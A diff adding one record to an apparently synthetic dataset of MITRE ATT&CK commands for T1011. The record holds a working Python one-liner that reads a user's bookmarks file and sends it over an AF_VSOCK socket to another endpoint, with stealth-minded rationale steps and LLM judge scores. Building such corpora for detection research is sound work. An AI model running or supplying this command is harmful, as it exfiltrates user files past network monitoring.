@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((3, 58821)); p=os.path.expanduser('~/.config/gtk-3.0/bookmarks'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Uses AF_VSOCK to send user bookmarks to another vsock endpoint (CID 3) over a non-IP medium, aligning with T1011.",
+  "rationale_steps": [
+    "Use vsock for out-of-band guest communications.",
+    "Target a high, atypical vsock port (58821).",
+    "Read and transmit user file contents over vsock.",
+    "Terminate session promptly to minimize visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-d6562e6e",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and parentheses with valid Python statements and tuple address for connect, making it fully parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates a user file over AF_VSOCK (a non-IP medium) to a specified CID/port consistent with T1011, but it relies on vsock support and a listening endpoint at CID 3:58821.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T01:02:15.930620Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket, setting timeout, connecting, reading a file, and sending data.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements T1011 by using AF_VSOCK (a non-TCP/IP socket) to exfiltrate user bookmark data to another endpoint (CID 3) over a different network medium than standard networking.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:02:21.114483Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes, valid Python syntax, and proper use of semicolons as statement separators within the string passed to `python3 -c`.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by using AF_VSOCK for data exfiltration, which represents a 'different network medium' from the perspective of a virtual machine's traditional IP network stack, bypassing standard network monitoring.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:22:38.563148Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
